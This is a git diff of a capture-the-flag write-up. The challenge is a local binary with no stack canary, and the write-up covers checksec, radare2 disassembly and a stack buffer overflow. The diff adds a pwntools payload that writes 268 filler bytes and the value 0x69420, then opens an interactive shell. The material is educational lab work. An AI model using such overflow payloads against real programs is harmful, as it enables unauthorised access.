@@ -5,13 +5,13 @@
 ##### Disassembling
 
 First we run ```checksec --file=a.out``` to see any vulnerabilities and see there is ```No canary found```. 
-Then we run ```r2 -Ad a.out``` to disassemble the file in debug mode and then enter ```s main``` to be taken to main and ```Vp``` to open visual.
 
 ```console
 RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
 Full RELRO      No canary found  NX enabled    PIE enabled     No RPATH   No RUNPATH   67) Symbols	  No	0		1		a.out
 ```
 
+Then we run ```r2 -Ad a.out``` to disassemble the file in debug mode and then enter ```s main``` to be taken to main and ```Vp``` to open visual.
 
 
 ```assembly
@@ -45,4 +45,6 @@ Full RELRO      No canary found  NX enabled    PIE enabled     No RPATH   No RUN
 ```           
 Here we notice that ```rbp-0x110``` is what we need to focus on and then overwrite ```rbp-0x4``` with 0x69420. So we subtract ```0x4``` from ```0x110*``` which gives us ```272-4=268```
 
-We hop on to ipython3 and ```from pwn import *``` and create a process with ```p = process ("./a.out")``` and send the junk to fill the space provided along with the new value we want to compare with.
+We hop on to ipython3 and ```from pwn import *``` and create a process with ```p = process ("./a.out")``` and send the junk to fill the space provided along with the new value we want to compare with ```p.sendline(b'A' * 268 + p32(0x69420))```
+
+After that we gain shell with ```p.interactive```.
